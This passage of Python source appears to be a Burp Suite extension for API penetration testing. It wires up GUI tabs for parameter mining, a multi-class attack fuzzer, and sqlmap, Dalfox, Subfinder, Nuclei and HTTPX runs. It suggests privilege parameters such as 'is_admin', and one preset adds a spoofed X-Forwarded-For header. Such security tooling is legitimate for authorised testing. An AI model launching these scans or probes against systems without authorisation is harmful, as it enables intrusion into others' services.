            "Clear", Color(220, 53, 69), lambda e: self.param_area.setText("")
        )
    )
    action_row.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.param_area.getText()),
        )
    )
    action_row.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "Param Miner", self.param_area.getText()
            ),
        )
    )

    top_panel.add(input_row)
    top_panel.add(preset_row)
    top_panel.add(action_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.param_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    return panel

def _mine_params(self):
    if not self.api_data:
        self.param_area.setText(
            "[!] No endpoints captured. Import data or capture traffic first."
        )
        self.log_to_ui("[!] No endpoints to mine")
        return

    base_params = [p.strip() for p in self.param_input.getText().split(",")]
    self.param_results = []
    lenient_mode = bool(
        hasattr(self, "param_lenient_checkbox")
        and self.param_lenient_checkbox is not None
        and self.param_lenient_checkbox.isSelected()
    )

    api_endpoints, filter_meta = self._collect_param_targets(
        strict_base=not lenient_mode
    )

    if not api_endpoints:
        self.param_area.setText(
            "[!] No API endpoints found (filtered out static/noisy endpoints)\n"
        )
        return

    # Group by priority
    high_priority = {}
    medium_priority = {}

    for key, entries in api_endpoints.items():
        entry = self._get_entry(entries)
        path = entry["normalized_path"].lower()
        method = entry["method"]

        # High priority: write operations or admin paths
        if method in ["POST", "PUT", "PATCH", "DELETE"] or any(
            x in path for x in ["/admin", "/user", "/account", "/profile"]
        ):
            high_priority[key] = entries
        else:
            medium_priority[key] = entries

    lines = []
    lines.append(
        "[*] Mode: {}".format("Lenient JSON GET" if lenient_mode else "Strict")
    )
    lines.append(
        "[*] Filtered: {} API endpoints (excluded {} static/noisy endpoints)".format(
            len(api_endpoints), filter_meta.get("excluded_endpoints", 0)
        )
    )
    lines.append(
        "[*] High Priority: {} | Medium Priority: {}\n".format(
            len(high_priority), len(medium_priority)
        )
    )

    # Process high priority first
    if high_priority:
        lines.append("\n=== HIGH PRIORITY (Write Operations) ===")
        for key, entries in sorted(high_priority.items())[:15]:
            entry = self._get_entry(entries)
            existing = entry.get("parameters", {})
            url_params = (
                list(existing.get("url", {}).keys())
                if isinstance(existing.get("url"), dict)
                else existing.get("url", [])
            )

            # Smart param suggestions based on endpoint
            path = entry["normalized_path"].lower()
            smart_params = list(base_params)
            if "/user" in path or "/account" in path:
                smart_params.extend(["user_id", "role", "is_admin"])
            if entry["method"] in ["POST", "PUT", "PATCH"]:
                smart_params.extend(["_method", "callback"])

            result = "{}\n  Existing: {}\n  Test: {}".format(
                key,
                ", ".join(url_params[:8]) if url_params else "None",
                ", ".join(list(set(smart_params))[:10]),
            )
            lines.append(result)
            self.param_results.append(result)

    # Process medium priority (limited)
    if medium_priority:
        lines.append("\n=== MEDIUM PRIORITY (Read Operations) ===")
        for key, entries in sorted(medium_priority.items())[:10]:
            entry = self._get_entry(entries)
            existing = entry.get("parameters", {})
            url_params = (
                list(existing.get("url", {}).keys())
                if isinstance(existing.get("url"), dict)
                else existing.get("url", [])
            )
            result = "{}\n  Existing: {}\n  Test: {}".format(
                key,
                ", ".join(url_params[:8]) if url_params else "None",
                ", ".join(base_params),
            )
            lines.append(result)
            self.param_results.append(result)

    if len(medium_priority) > 10:
        lines.append(
            "\n[*] {} more medium priority endpoints not shown".format(
                len(medium_priority) - 10
            )
        )

    self.param_area.setText(
        self._format_result(
            "Parameter Mining: {}".format(", ".join(base_params)), lines
        )
    )
    self.log_to_ui(
        "[*] Param mining: {} API endpoints ({} high, {} medium)".format(
            len(api_endpoints), len(high_priority), len(medium_priority)
        )
    )

def _export_param_results(self):
    """Export param mining results - only saves when user clicks Export"""
    if not hasattr(self, "param_results") or not self.param_results:
        self.param_area.append("\n[!] Run 'Mine Params' first\n")
        return
    import os

    export_dir = self._get_export_dir("ParamMiner_Export")
    if not export_dir:
        return
    filepath = os.path.join(export_dir, "param_mining.txt")
    writer = None
    try:
        writer = FileWriter(filepath)
        for result in self.param_results:
            writer.write(result + "\n\n")
        self.param_area.append(
            "\n[+] Exported {} results\n[+] Folder: {}\n[+] File: {}\n".format(
                len(self.param_results), export_dir, filepath
            )
        )
        self.log_to_ui("[+] Exported param mining to: {}".format(export_dir))
    except Exception as e:
        self.param_area.append("\n[!] Export failed: {}\n".format(str(e)))
    finally:
        if writer:
            try:
                writer.close()
            except Exception as e:
                self._callbacks.printError(
                    "Error closing param mining file: {}".format(str(e))
                )

def _create_fuzzer_tab(self):
    """Create Fuzzer tab"""
    panel = JPanel(BorderLayout())

    controls = JPanel(FlowLayout(FlowLayout.LEFT))
    controls.add(JLabel("Attack:"))
    self.attack_type_combo = JComboBox(
        [
            "All",
            "BOLA",
            "IDOR",
            "Auth Bypass",
            "SQLi",
            "XSS",
            "NoSQL",
            "Path Traversal",
            "Mass Assignment",
            "Race Condition",
            "GraphQL",
            "JWT",
            "SSTI",
            "Deserialization",
            "Business Logic",
            "SSRF",
            "XXE",
            "WAF Bypass",
        ]
    )
    controls.add(self.attack_type_combo)
    self.fuzzer_lenient_checkbox = JCheckBox("Lenient JSON GET", True)
    self.fuzzer_lenient_checkbox.setToolTipText(
        "Broaden endpoint selection to include structured GET routes"
    )
    controls.add(self.fuzzer_lenient_checkbox)
    controls.add(
        self._create_action_button(
            "Generate",
            Color(220, 53, 69),
            lambda e: self._generate_fuzzing(
                str(self.attack_type_combo.getSelectedItem())
            ),
        )
    )
    controls.add(
        self._create_action_button(
            "Send to Intruder",
            Color(255, 140, 0),
            lambda e: self._send_fuzzing_to_intruder(),
        )
    )
    controls.add(
        self._create_action_button(
            "Export Payloads", Color(0, 123, 255), lambda e: self._export_payloads()
        )
    )
    controls.add(
        self._create_action_button(
            "Turbo Intruder",
            Color(255, 87, 34),
            lambda e: self._export_turbo_intruder(),
        )
    )
    controls.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.fuzzer_area.setText("")
        )
    )
    controls.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.fuzzer_area.getText()),
        )
    )
    controls.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("Fuzzer", self.fuzzer_area.getText()),
        )
    )
    controls.add(
        self._create_action_button(
            "Copy as cURL",
            Color(76, 175, 80),
            lambda e: self._copy_attack_as_curl(),
        )
    )

    panel.add(controls, BorderLayout.NORTH)

    self.fuzzer_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.fuzzing_attacks = []
    return panel

def _create_sqlmap_verify_tab(self):
    """Create SQLMap verification tab for SQLi candidate confirmation."""
    import os

    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))
    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("SQLMap Path:"))
    sqlmap_candidates = [
        os.path.expanduser("~/.local/bin/sqlmap"),
        os.path.expanduser("~/go/bin/sqlmap"),
        "sqlmap",
    ]
    default_sqlmap = next(
        (p for p in sqlmap_candidates if os.path.exists(p)),
        "sqlmap",
    )
    self.sqlmap_path_field = JTextField(default_sqlmap, 28)
    controls_line1.add(self.sqlmap_path_field)
    controls_line1.add(JLabel("Max Targets:"))
    self.sqlmap_max_targets_field = JTextField("12", 4)
    controls_line1.add(self.sqlmap_max_targets_field)
    controls_line1.add(JLabel("Per Target Timeout(s):"))
    self.sqlmap_target_timeout_field = JTextField("45", 4)
    controls_line1.add(self.sqlmap_target_timeout_field)
    controls_line1.add(JLabel("Profile:"))
    self.sqlmap_profile_combo = JComboBox(self._profile_labels())
    self.sqlmap_profile_combo.setSelectedItem("Balanced")
    controls_line1.add(self.sqlmap_profile_combo)
    controls_line2.add(
        self._create_action_button(
            "Run Verify", Color(220, 53, 69), lambda e: self._run_sqlmap_verify(e)
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_sqlmap(e)
        )
    )
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "sqlmap_area", None))
    controls_line2.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._send_sqlmap_to_recon(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_sqlmap_results(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(108, 117, 125), lambda e: self.sqlmap_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(96, 125, 139),
            lambda e: self._copy_to_clipboard(self.sqlmap_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "SQLMap Verify", self.sqlmap_area.getText()
            ),
        )
    )

    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    panel.add(top_panel, BorderLayout.NORTH)
    self.sqlmap_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.sqlmap_findings = []
    self.sqlmap_verified_candidates = []
    self.sqlmap_lock = threading.Lock()
    return panel

def _create_dalfox_verify_tab(self):
    """Create Dalfox verification tab for reflected XSS confirmation."""
    import os

    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))
    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("Dalfox Path:"))
    dalfox_candidates = [
        os.path.expanduser("~/go/bin/dalfox"),
        os.path.expanduser("~/.local/bin/dalfox"),
        "dalfox",
    ]
    default_dalfox = next(
        (p for p in dalfox_candidates if os.path.exists(p)),
        "dalfox",
    )
    self.dalfox_path_field = JTextField(default_dalfox, 28)
    controls_line1.add(self.dalfox_path_field)
    controls_line1.add(JLabel("Max Targets:"))
    self.dalfox_max_targets_field = JTextField("12", 4)
    controls_line1.add(self.dalfox_max_targets_field)
    controls_line1.add(JLabel("Per Target Timeout(s):"))
    self.dalfox_target_timeout_field = JTextField("40", 4)
    controls_line1.add(self.dalfox_target_timeout_field)
    controls_line1.add(JLabel("Profile:"))
    self.dalfox_profile_combo = JComboBox(self._profile_labels())
    self.dalfox_profile_combo.setSelectedItem("Balanced")
    controls_line1.add(self.dalfox_profile_combo)
    controls_line2.add(
        self._create_action_button(
            "Run Verify", Color(220, 53, 69), lambda e: self._run_dalfox_verify(e)
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_dalfox(e)
        )
    )
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "dalfox_area", None))
    controls_line2.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._send_dalfox_to_recon(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_dalfox_results(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(108, 117, 125), lambda e: self.dalfox_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(96, 125, 139),
            lambda e: self._copy_to_clipboard(self.dalfox_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "Dalfox Verify", self.dalfox_area.getText()
            ),
        )
    )

    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    panel.add(top_panel, BorderLayout.NORTH)
    self.dalfox_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.dalfox_findings = []
    self.dalfox_verified_candidates = []
    self.dalfox_lock = threading.Lock()
    return panel

def _create_api_asset_discovery_tab(self):
    """Create Subfinder tab for API asset domain discovery."""
    import os

    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls = JPanel(FlowLayout(FlowLayout.LEFT))
    controls.add(JLabel("Domains (comma/newline, optional):"))
    self.asset_domains_field = JTextField("", 28)
    self.asset_domains_field.setToolTipText(
        "Leave empty to auto-derive base domains from Recon hosts"
    )
    controls.add(self.asset_domains_field)
    controls.add(JLabel("Max Domains:"))
    self.asset_max_domains_field = JTextField("8", 3)
    controls.add(self.asset_max_domains_field)
    controls.add(
        self._create_action_button(
            "Show Targets",
            Color(70, 130, 180),
            lambda e: self._show_asset_targets_popup(e),
        )
    )
    controls.add(JLabel("Profile:"))
    self.asset_profile_combo = JComboBox(self._profile_labels())
    self.asset_profile_combo.setSelectedItem("Balanced")
    controls.add(self.asset_profile_combo)
    controls.add(JLabel("Subfinder Path:"))
    self.asset_subfinder_path_field = JTextField(
        os.path.expanduser("~/go/bin/subfinder"), 22
    )
    controls.add(self.asset_subfinder_path_field)
    self.asset_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
    controls.add(self.asset_custom_cmd_checkbox)
    controls.add(JLabel("Command:"))
    self.asset_custom_cmd_field = JTextField("", 35)
    self.asset_custom_cmd_field.setToolTipText(
        "Example: {subfinder_path} -dL {domains_file} -silent -o {output_file}"
    )
    controls.add(self.asset_custom_cmd_field)
    controls.add(JLabel("Preset:"))
    self.asset_preset_help_label = JLabel(
        "Preset Help: Choose a Subfinder command template."
    )
    asset_presets = [
        (
            "Silent Domain List",
            "{subfinder_path} -dL {domains_file} -silent -o {output_file}",
            "Recommended baseline using domain list input and silent output.",
        ),
        (
            "Recursive",
            "{subfinder_path} -dL {domains_file} -silent -recursive -o {output_file}",
            "Adds recursive enumeration for deeper subdomain coverage.",
        ),
        (
            "All Sources",
            "{subfinder_path} -dL {domains_file} -silent -all -o {output_file}",
            "Queries all supported passive sources for max coverage.",
        ),
    ]
    controls.add(
        self._create_command_preset_combo(
            self.asset_custom_cmd_field,
            self.asset_custom_cmd_checkbox,
            asset_presets,
            self.asset_preset_help_label,
        )
    )
    controls.add(
        self._create_preset_help_button(
            "Subfinder",
            ["{subfinder_path}", "{domains_file}", "{output_file}"],
            asset_presets,
            usage_notes=[
                "Use local ProjectDiscovery subfinder binary in Subfinder Path.",
                "Leave domains empty to auto-derive base domains from Recon hosts.",
            ],
            override_notes=[
                "Include {output_file} so this tab can parse discovered assets.",
                "Include {domains_file} if you want Recon-derived domains as input.",
            ],
        )
    )

    actions_row = JPanel(FlowLayout(FlowLayout.LEFT))
    actions_row.add(
        self._create_action_button(
            "Run Subfinder",
            Color(138, 43, 226),
            lambda e: self._run_api_asset_discovery(e),
        )
    )
    actions_row.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_asset_discovery(e)
        )
    )
    self._add_force_kill_button(
        actions_row, lambda: getattr(self, "asset_area", None)
    )
    actions_row.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._send_asset_discovery_to_recon(),
        )
    )
    actions_row.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_asset_discovery_results(),
        )
    )
    actions_row.add(
        self._create_action_button(
            "Clear", Color(108, 117, 125), lambda e: self.asset_area.setText("")
        )
    )
    actions_row.add(
        self._create_action_button(
            "Copy",
            Color(96, 125, 139),
            lambda e: self._copy_to_clipboard(self.asset_area.getText()),
        )
    )
    actions_row.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "API Asset Discovery", self.asset_area.getText()
            ),
        )
    )
    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(self.asset_preset_help_label)

    top_panel.add(controls)
    top_panel.add(actions_row)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)
    self.asset_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.asset_discovered = []
    self.asset_target_candidates = []
    self.asset_selected_domains = []
    self.asset_lock = threading.Lock()
    self._autopopulate_asset_domains_from_history(
        overwrite=False, append_output=False
    )
    return panel

def _create_openapi_drift_tab(self):
    """Create OpenAPI drift analysis tab (observed traffic vs spec)."""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls = JPanel(FlowLayout(FlowLayout.LEFT))
    controls.add(JLabel("OpenAPI/Swagger File or URL:"))
    self.openapi_spec_field = JTextField("", 40)
    self.openapi_spec_field.setToolTipText(
        "Local file path (.json/.yaml) or URL to OpenAPI document"
    )
    controls.add(self.openapi_spec_field)
    controls.add(
        self._create_action_button(
            "Browse",
            Color(96, 125, 139),
            lambda e: self._browse_openapi_spec_file(),
        )
    )
    controls.add(
        self._create_action_button(
            "Detect",
            Color(70, 130, 180),
            lambda e: self._detect_openapi_spec_from_history(e),
        )
    )
    controls.add(
        self._create_action_button(
            "Show Targets",
            Color(70, 130, 180),
            lambda e: self._show_openapi_spec_targets_popup(e),
        )
    )
    controls.add(
        self._create_action_button(
            "Run Drift", Color(138, 43, 226), lambda e: self._run_openapi_drift(e)
        )
    )
    controls.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_openapi_drift(e)
        )
    )
    self._add_force_kill_button(controls, lambda: getattr(self, "openapi_area", None))
    controls.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._send_openapi_to_recon(),
        )
    )
    controls.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_openapi_drift_results(),
        )
    )
    controls.add(
        self._create_action_button(
            "Clear", Color(108, 117, 125), lambda e: self.openapi_area.setText("")
        )
    )
    controls.add(
        self._create_action_button(
            "Copy",
            Color(96, 125, 139),
            lambda e: self._copy_to_clipboard(self.openapi_area.getText()),
        )
    )
    controls.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "OpenAPI Drift", self.openapi_area.getText()
            ),
        )
    )

    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(
        JLabel(
            "Flags undocumented observed endpoints, missing spec endpoints, and parameter drift."
        )
    )

    top_panel.add(controls)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)
    self.openapi_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.openapi_drift_results = []
    self.openapi_missing_candidates = []
    self.openapi_spec_candidates = []
    self.openapi_selected_spec_targets = []
    self.openapi_lock = threading.Lock()
    self._autoselect_openapi_spec_from_history(append_output=False)
    return panel

def _create_auth_replay_tab(self):
    return jython_size_helpers.create_auth_replay_tab(self)

def _create_passive_discovery_tab(self):
    """Create passive discovery tab based on captured/replayed proxy history."""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls = JPanel(FlowLayout(FlowLayout.LEFT))
    controls.add(JLabel("Scope:"))
    self.passive_scope_combo = JComboBox(
        ["Selected Endpoint", "Filtered View", "All Endpoints"]
    )
    self.passive_scope_combo.setSelectedItem("All Endpoints")
    controls.add(self.passive_scope_combo)
    controls.add(JLabel("Mode:"))
    self.passive_mode_combo = JComboBox(
        [
            "All",
            "API5 (BFLA)",
            "API3 (Data)",
            "API4 (Resource)",
            "API6 (Flows)",
            "API9 (Version)",
            "API10 (Consumption)",
        ]
    )
    controls.add(self.passive_mode_combo)
    controls.add(JLabel("Max:"))
    self.passive_max_field = JTextField("250", 4)
    controls.add(self.passive_max_field)

    actions_row = JPanel(FlowLayout(FlowLayout.LEFT))
    actions_row.add(JLabel("Passive Checks:"))
    actions_row.add(
        self._create_action_button(
            "Run Passive", Color(40, 167, 69), lambda e: self._run_passive_discovery(e)
        )
    )
    actions_row.add(
        self._create_action_button(
            "Export",
            Color(70, 130, 180),
            lambda e: self._export_passive_discovery_results(),
        )
    )
    actions_row.add(
        self._create_action_button(
            "Clear",
            Color(220, 53, 69),
            lambda e: self.passive_area.setText(""),
        )
    )
    actions_row.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.passive_area.getText()),
        )
    )
    actions_row.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "Passive Discovery", self.passive_area.getText()
            ),
        )
    )

    deep_logic_row = JPanel(FlowLayout(FlowLayout.LEFT))
    deep_logic_row.add(JLabel("Deep Logic:"))
    deep_logic_row.add(
        self._create_action_button(
            "Run Invariants",
            Color(106, 90, 205),
            lambda e: self._run_sequence_invariants(e),
        )
    )
    deep_logic_row.add(
        self._create_action_button(
            "Run Differential",
            Color(75, 0, 130),
            lambda e: self._run_counterfactual_differentials(e),
        )
    )
    deep_logic_row.add(
        self._create_action_button(
            "Run Token Lineage",
            Color(65, 105, 225),
            lambda e: self._run_token_lineage_analysis(e),
        )
    )
    deep_logic_row.add(
        self._create_action_button(
            "Run Parity Drift",
            Color(72, 61, 139),
            lambda e: self._run_parity_drift_analysis(e),
        )
    )
    deep_logic_row.add(
        self._create_action_button(
            "Export Ledger",
            Color(72, 61, 139),
            lambda e: self._export_sequence_invariant_ledger(),
        )
    )
    deep_logic_row.add(
        JLabel(
            "Non-destructive deep logic checks. Includes scoreless differential invariants plus Sequence/Golden/State/Token Lineage/Parity Drift analysis."
        )
    )

    advanced_logic_row = JPanel(FlowLayout(FlowLayout.LEFT))
    advanced_logic_row.add(JLabel("Advanced Logic:"))
    advanced_logic_row.add(
        self._create_action_button(
            "Run All Advanced",
            Color(148, 0, 211),
            lambda e: self._run_all_advanced_logic(e),
        )
    )
    advanced_logic_row.add(
        self._create_action_button(
            "Abuse Chains",
            Color(139, 0, 139),
            lambda e: self._run_abuse_chain_builder(e),
        )
    )
    advanced_logic_row.add(
        self._create_action_button(
            "Proof Mode",
            Color(199, 21, 133),
            lambda e: self._run_proof_mode(e),
        )
    )
    advanced_logic_row.add(
        self._create_action_button(
            "Spec Guardrails",
            Color(72, 61, 139),
            lambda e: self._run_spec_guardrails(e),
        )
    )
    advanced_logic_row.add(
        self._create_action_button(
            "Role Delta",
            Color(123, 104, 238),
            lambda e: self._run_role_delta_engine(e),
        )
    )
    advanced_logic_row.add(
        JLabel(
            "Graph-to-replay chains, auto-PoC packet sets, behavior guardrails, and role delta ranking."
        )
    )

    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(
        JLabel(
            "Passive only: analyzes captured/replayed proxy history. No active requests are sent."
        )
    )

    top_panel.add(controls)
    top_panel.add(actions_row)
    top_panel.add(deep_logic_row)
    top_panel.add(advanced_logic_row)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.passive_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.passive_discovery_findings = []
    self.sequence_invariant_findings = []
    self.sequence_invariant_ledger = {}
    self.sequence_invariant_meta = {}
    self.counterfactual_findings = []
    self.counterfactual_summary = {}
    self.counterfactual_meta = {}
    self.golden_ticket_findings = []
    self.golden_ticket_ledger = {}
    self.golden_ticket_meta = {}
    self.state_transition_findings = []
    self.state_transition_ledger = {}
    self.state_transition_meta = {}
    self.token_lineage_findings = []
    self.token_lineage_ledger = {}
    self.token_lineage_meta = {}
    self.parity_drift_findings = []
    self.parity_drift_ledger = {}
    self.parity_drift_meta = {}
    self.advanced_logic_packages = {}
    return panel

def _create_nuclei_tab(self):
    """Create Nuclei scanner tab"""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("Nuclei Path:"))
    import os

    nuclei_candidates = [
        os.path.expanduser("~/go/bin/nuclei"),
        os.path.expanduser("~/go/bin/nuclei.exe"),
        "nuclei.exe" if os.name == "nt" else "nuclei",
        "nuclei",
    ]
    default_nuclei = next(
        (p for p in nuclei_candidates if os.path.exists(p)),
        "nuclei.exe" if os.name == "nt" else "nuclei",
    )
    self.nuclei_path_field = JTextField(
        default_nuclei, 25
    )
    controls_line1.add(self.nuclei_path_field)
    self.nuclei_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
    controls_line1.add(self.nuclei_custom_cmd_checkbox)
    controls_line1.add(JLabel("Command:"))
    self.nuclei_custom_cmd_field = JTextField("", 35)
    self.nuclei_custom_cmd_field.setToolTipText(
        "Example: {nuclei_path} -list {targets_file} -jsonl-export {json_file} -silent"
    )
    controls_line1.add(self.nuclei_custom_cmd_field)
    controls_line1.add(JLabel("Preset:"))
    self.nuclei_preset_help_label = JLabel(
        "Preset Help: Choose preset for quick safe command templates."
    )
    nuclei_presets = [
        (
            "Recon Fast",
            '{nuclei_path} -list {targets_file} -tags swagger,openapi,graphql -etags dos,intrusive,headless,cve,fuzz,fuzzing,brute-force -timeout 8 -retries 1 -rate-limit 100 -c 20 -bs 8 -mhe 8 -ss host-spray -no-httpx -project -silent -header "X-Forwarded-For: 127.0.0.1" -jsonl-export {json_file}',
            "Optimized for speed: only core API discovery tags.",
        ),
        (
            "High/Critical",
            "{nuclei_path} -list {targets_file} -severity critical,high -timeout 12 -retries 2 -rate-limit 40 -c 8 -silent -jsonl-export {json_file}",
            "Prioritizes only high and critical findings for quick triage.",
        ),
        (
            "API/Auth Focus",
            "{nuclei_path} -list {targets_file} -tags swagger,openapi,graphql,auth,jwt,config -timeout 10 -retries 2 -rate-limit 45 -c 8 -silent -jsonl-export {json_file}",
            "Targets API/authentication and configuration checks with focused templates.",
        ),
    ]
    controls_line1.add(
        self._create_command_preset_combo(
            self.nuclei_custom_cmd_field,
            self.nuclei_custom_cmd_checkbox,
            nuclei_presets,
            self.nuclei_preset_help_label,
        )
    )
    controls_line1.add(
        self._create_preset_help_button(
            "Nuclei",
            ["{nuclei_path}", "{targets_file}", "{output_file}", "{json_file}"],
            nuclei_presets,
            usage_notes=[
                "Use local ProjectDiscovery nuclei binary in Nuclei Path.",
                "Default mode scans scoped first-party Recon targets (base URLs + API paths).",
                "Use tags and etags presets for fast API-focused coverage.",
            ],
            override_notes=[
                "Include {json_file} so results can be parsed in this tab.",
                "Preferred JSON output flag: -jsonl-export {json_file}.",
                "Include {targets_file} if you want to keep Recon-derived target scope.",
                "Avoid unsupported flags for your local version (for example: -random-agent).",
            ],
        )
    )
    controls_line1.add(JLabel("Profile:"))
    self.nuclei_profile_combo = JComboBox(self._profile_labels())
    self.nuclei_profile_combo.setSelectedItem("Fast")
    controls_line1.add(self.nuclei_profile_combo)
    controls_line2.add(
        self._create_action_button(
            "Run Nuclei", Color(138, 43, 226), lambda e: self._run_nuclei()
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_nuclei(e)
        )
    )
    self._add_target_scope_controls(controls_line2)
    self._add_force_kill_button(
        controls_line2, lambda: getattr(self, "nuclei_area", None)
    )
    controls_line2.add(
        self._create_action_button(
            "Export Targets",
            Color(70, 130, 180),
            lambda e: self._export_nuclei_targets(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.nuclei_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.nuclei_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("Nuclei", self.nuclei_area.getText()),
        )
    )

    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(self.nuclei_preset_help_label)
    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.nuclei_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    return panel

def _create_httpx_tab(self):
    """Create HTTPX probe tab"""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("HTTPX Path:"))
    import os

    httpx_paths = [
        os.path.expanduser("~/go/bin/httpx"),
        os.path.expanduser("~/go/bin/httpx.exe"),
        "/usr/local/bin/httpx",
        "httpx.exe" if os.name == "nt" else "httpx",
        "httpx",
    ]
    default_httpx = next(
        (p for p in httpx_paths if os.path.exists(p)),
        "httpx.exe" if os.name == "nt" else "httpx",
    )
    self.httpx_path_field = JTextField(default_httpx, 25)
    controls_line1.add(self.httpx_path_field)
    self.httpx_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
    controls_line1.add(self.httpx_custom_cmd_checkbox)
    controls_line1.add(JLabel("Command:"))
    self.httpx_custom_cmd_field = JTextField("", 35)
    self.httpx_custom_cmd_field.setToolTipText(
        "Example: {httpx_path} -l {urls_file} -status-code -nc -silent"
    )
    controls_line1.add(self.httpx_custom_cmd_field)
    controls_line1.add(JLabel("Preset:"))
    self.httpx_preset_help_label = JLabel(
        "Preset Help: Choose preset for common HTTP probe profiles."
    )
    httpx_presets = [
        (
            "Status+NoColor",
            "{httpx_path} -l {urls_file} -status-code -nc -silent",
            "Basic status-code probe with clean output formatting.",
        ),
        (
            "Status+Title",
            "{httpx_path} -l {urls_file} -status-code -title -nc -silent",
